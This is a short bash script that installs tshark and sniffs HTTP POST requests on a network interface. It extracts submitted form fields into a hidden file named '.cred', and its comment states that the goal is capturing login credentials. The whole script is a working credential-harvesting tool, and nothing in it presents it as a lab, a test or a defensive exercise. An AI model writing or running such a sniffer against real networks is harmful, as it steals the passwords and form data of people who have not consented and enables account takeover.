#!/bin/bash

# install tshark
sudo apt-get install tshark

# listen for packets and pipe login credentials to file
tshark -i en0 -Y 'http.request.method == POST' -T fields -e urlencoded-form.key -e urlencoded-form.value > .cred
